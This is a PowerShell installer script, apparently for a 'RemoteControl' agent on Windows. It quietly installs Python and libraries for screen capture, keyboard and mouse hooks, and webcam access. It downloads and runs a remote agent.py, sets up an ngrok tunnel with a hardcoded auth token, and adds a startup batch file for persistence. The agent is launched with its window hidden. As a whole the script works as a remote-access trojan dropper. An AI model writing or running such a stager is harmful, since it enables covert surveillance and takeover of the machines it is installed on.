$dir = "$env:APPDATA\RemoteControl"
$agentUrl = "https://raw.githubusercontent.com/KIm-Taeyoon1001/rc-setup/main/agent.py"
$agentPath = "$dir\agent.py"

New-Item -ItemType Directory -Path $dir -Force | Out-Null

$hasPy = $null -ne (Get-Command python -ErrorAction SilentlyContinue)
if (-not $hasPy) {
    $inst = "$env:TEMP\py_setup.exe"
    Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile $inst
    Start-Process $inst -ArgumentList "/quiet PrependPath=1" -Wait
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
}

python -m pip install websockets mss pynput opencv-python numpy requests --quiet --user

Invoke-WebRequest $agentUrl -OutFile $agentPath

$ngrokPath = "$dir\ngrok.exe"
if (-not (Test-Path $ngrokPath)) {
    Invoke-WebRequest "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile "$env:TEMP\ngrok.zip"
    Expand-Archive "$env:TEMP\ngrok.zip" -DestinationPath $dir -Force
    & $ngrokPath config add-authtoken 3HRUF20sBOnN98Meuyzjjc4gRcT_7SnRxBPFXe5QSP6UEJzVL
}

taskkill /F /IM pythonw.exe 2>$null
taskkill /F /IM ngrok.exe 2>$null

$pyPath = (Get-Command python).Source -replace 'python.exe','pythonw.exe'
$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Set-Content "$startup\RC_Agent.bat" "@echo off`r`ntaskkill /F /IM pythonw.exe 2>nul`r`ntaskkill /F /IM ngrok.exe 2>nul`r`nstart /min `"`" `"$pyPath`" `"$agentPath`""

Start-Process $pyPath -ArgumentList "`"$agentPath`"" -WindowStyle Hidden

Write-Host "done: $env:COMPUTERNAME" -ForegroundColor Green
